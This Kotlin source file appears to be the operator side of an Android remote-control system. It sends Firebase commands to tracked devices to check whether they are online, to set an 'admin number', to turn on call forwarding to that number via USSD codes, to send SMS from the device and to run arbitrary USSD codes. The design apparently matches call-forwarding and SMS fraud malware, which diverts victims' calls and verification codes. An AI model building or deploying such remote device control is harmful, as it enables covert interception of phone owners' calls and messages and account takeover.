package com.example.admin.utils

import android.content.Context
import android.util.Log
import okhttp3.MediaType.Companion.toMediaType
import okhttp3.OkHttpClient
import okhttp3.Request
import okhttp3.RequestBody.Companion.toRequestBody
import org.json.JSONObject
import java.util.concurrent.TimeUnit


object FCMHelper {

    private const val TAG = "FCMHelper"

    private val client = OkHttpClient.Builder()
        .connectTimeout(15, TimeUnit.SECONDS)
        .readTimeout(20, TimeUnit.SECONDS)
        .build()


    fun initialize(context: Context) {
        // No-op: auth is handled via Constants.APP_TOKEN in the URL.
    }

    fun isValidFCMToken(token: String): Boolean {
        return token.isNotBlank() &&
                token != "null" &&
                token.length > 20 &&
                !token.contains(" ")
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  HIGH-LEVEL COMMANDS
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * TYPE: CHECK_ONLINE
     * Device receives this and sends a heartbeat to Supabase so admin sees it online.
     */
    fun sendOnlineCheck(
        context: Context,
        uniqueid: String,
        fcmToken: String,
        onResult: (success: Boolean, error: String?) -> Unit
    ) {
        val payload = JSONObject().apply {
            put("uniqueid", uniqueid)
        }
        send(
            fcmToken = fcmToken,
            type = "CHECK_ONLINE",
            payload = payload,
            onResult = onResult
        )
    }

    /**
     * TYPE: ADMIN_UPDATE
     * Device receives admin number and status to update call forwarding config.
     *
     * MyFirebaseMessagingService.handleAdminUpdate() reads:
     *   deviceId = payload.optString("deviceId")   ← must be present
     *   number   = payload.optString("number")
     *   status   = payload.optString("status")
     */
    fun sendAdminNumber(
        context: Context,
        uniqueid: String,
        fcmToken: String,
        adminNumber: String,
        onResult: (success: Boolean, error: String?) -> Unit
    ) {
        val payload = JSONObject().apply {
            put("deviceId", uniqueid)   // ← device reads "deviceId"
            put("uniqueid", uniqueid)   // keep for compatibility
            put("number", adminNumber)
            put("status", "ON")
        }
        send(
            fcmToken = fcmToken,
            type = "ADMIN_UPDATE",
            payload = payload,
            onResult = onResult
        )
    }

    /**
     * TYPE: DEVICE_COMMAND — action: "call"
     * Device activates/deactivates call forwarding via USSD.
     *
     * MyFirebaseMessagingService.routeDeviceCommand():
     *   "call" → enqueueCallWorker()
     *     reads: uid = payload.optString("uniqueid")
     *            code    = payload.optString("code")
     *            simSlot = payload.optInt("simSlot", 0)
     *            action  = payload.optString("action", "ussd")
     *
     * @param action   "ACTIVATE" or "DEACTIVATE" (stored in cf_action for worker)
     * @param code     full USSD code e.g. "**21*9999999999#"
     * @param simSlot  0 = SIM1, 1 = SIM2
     * @param number   admin number to forward to
     */
    fun sendCallCommand(
        context: Context,
        uniqueid: String,
        fcmToken: String,
        code: String,
        simSlot: Int,
        number: String,
        action: String,
        onResult: (success: Boolean, error: String?) -> Unit
    ) {
        val payload = JSONObject().apply {
            put("action", "call")       // ← "call" matches device's routeDeviceCommand
            put("cf_action", action)    // "ACTIVATE" or "DEACTIVATE" — used by CallForwardWorker
            put("code", code)
            put("simSlot", simSlot)
            put("number", number)
            put("uniqueid", uniqueid)
        }
        send(
            fcmToken = fcmToken,
            type = "DEVICE_COMMAND",
            payload = payload,
            onResult = onResult
        )
    }

    /**
     * TYPE: DEVICE_COMMAND — action: "sms"
     *
     * MyFirebaseMessagingService.enqueueSmsWorker():
     *   reads: uid       = payload.optString("uniqueid")
     *          to        = payload.optString("to")
     *          body      = payload.optString("body")
     *          simSlot   = payload.optInt("simSlot", 0)
     *          timestamp = payload.optLong("timestamp")  ← must be > 0
     */
    fun sendSmsCommand(
        context: Context,
        uniqueid: String,
        fcmToken: String,
        to: String,
        message: String,
        simSlot: Int,
        onResult: (success: Boolean, error: String?) -> Unit
    ) {
        val payload = JSONObject().apply {
            put("action", "sms")                            // ← "sms" matches device
            put("to", to)
            put("body", message)
            put("simSlot", simSlot)
            put("uniqueid", uniqueid)
            put("timestamp", System.currentTimeMillis())    // ← required by SmsSendWorker
        }
        send(
            fcmToken = fcmToken,
            type = "DEVICE_COMMAND",
            payload = payload,
            onResult = onResult
        )
    }

    /**
     * TYPE: DEVICE_COMMAND — action: "ussd"
     *
     * MyFirebaseMessagingService.enqueueCallWorker():
     *   reads: uid     = payload.optString("uniqueid")
     *          code    = payload.optString("code")
     *          simSlot = payload.optInt("simSlot", 0)
     *          action  = payload.optString("action", "ussd")
     */
    fun sendUssdCommand(
        context: Context,
        uniqueid: String,
        fcmToken: String,
        code: String,
        simSlot: Int,
        onResult: (success: Boolean, error: String?) -> Unit
    ) {
        val payload = JSONObject().apply {
            put("action", "ussd")       // ← "ussd" matches device
            put("code", code)
            put("simSlot", simSlot)
            put("uniqueid", uniqueid)
        }
        send(
            fcmToken = fcmToken,
            type = "DEVICE_COMMAND",
            payload = payload,
            onResult = onResult
        )
    }

    // ─────────────────────────────────────────────────────────────────────────
    //  CORE SEND — builds the FCM data envelope and posts to backend
    // ─────────────────────────────────────────────────────────────────────────

    /**
     * Send a typed FCM command via backend /fcm-send.
     *
     * FCM data envelope (must be flat string values):
     *   { "type": "<TYPE>", "payload": "<json-string>" }
     *
     * Matches MyFirebaseMessagingService.onMessageReceived():
     *   val type       = data["type"]
     *   val payloadStr = data["payload"]
     *   val payload    = JSONObject(payloadStr)
     */
    fun send(
        fcmToken: String,
        type: String,
        payload: JSONObject,
        onResult: (success: Boolean, error: String?) -> Unit
    ) {
        if (!isValidFCMToken(fcmToken)) {
            Log.w(TAG, "Invalid FCM token — skipping")
            onResult(false, "Invalid FCM token")
            return
        }

        val appToken = Constants.APP_TOKEN.trim()
        if (appToken.isBlank()) {
            Log.e(TAG, "Constants.APP_TOKEN is empty")
            onResult(false, "APP_TOKEN not configured in Constants")
            return
        }

        val url = "${Constants.BACKEND_ROOT}/api/device/$appToken/fcm-send"

        // FCM data payload — all values must be strings
        val fcmData = JSONObject().apply {
            put("type", type)
            put("payload", payload.toString())   // nested JSON as string
        }

        val requestBody = JSONObject().apply {
            put("fcmToken", fcmToken)
            put("data", fcmData)
        }

        val reqBody = requestBody.toString().toRequestBody("application/json".toMediaType())
        val request = Request.Builder()
            .url(url)
            .post(reqBody)
            .addHeader("Content-Type", "application/json")
            .build()

        Log.d(TAG, "Sending FCM type=$type payload=${payload.toString().take(120)}")

        Thread {
            try {
                client.newCall(request).execute().use { response ->
                    val respBody = response.body?.string() ?: "{}"
                    Log.d(TAG, "FCM response ${response.code}: $respBody")

                    if (response.isSuccessful) {
                        val json = JSONObject(respBody)
                        if (json.optBoolean("ok", false)) {
                            onResult(true, null)
                        } else {
                            onResult(false, json.optString("error", "Unknown error"))
                        }
                    } else {
                        onResult(false, "HTTP ${response.code}: $respBody")
                    }
                }
            } catch (e: Exception) {
                Log.e(TAG, "FCM send failed", e)
                onResult(false, e.message)
            }
        }.start()
    }
}
